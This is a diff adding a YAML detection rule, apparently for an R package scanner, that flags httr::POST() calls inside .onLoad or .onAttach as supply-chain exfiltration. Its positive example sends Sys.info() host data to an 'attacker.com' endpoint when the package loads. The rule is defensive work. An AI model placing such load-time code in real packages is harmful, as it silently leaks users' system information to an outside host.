@@ -1,0 +1,31 @@
+name: onload_calls_httr_POST_rule
+version: "0.1.0"
+type: warning
+attck:
+  - T1041
+  - T1195.002
+message: >-
+  httr::POST() inside .onLoad or .onAttach sends an outbound HTTP POST request
+  automatically at package load time.
+description: >-
+  Flag httr::POST() calls inside .onLoad or .onAttach.
+xpath: >-
+  //expr[
+    LEFT_ASSIGN
+    and expr[1]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+    and expr[FUNCTION][
+      .//expr[
+        SYMBOL_PACKAGE[text() = 'httr']
+        and NS_GET
+        and SYMBOL_FUNCTION_CALL[text() = 'POST']
+      ]
+    ]
+  ]
+example_positive: |
+  .onLoad <- function(libname, pkgname) {
+    httr::POST("https://attacker.com/collect", body = list(host = Sys.info()))
+  }
+example_negative: |
+  .onLoad <- function(libname, pkgname) {
+    packageStartupMessage("Package loaded.")
+  }
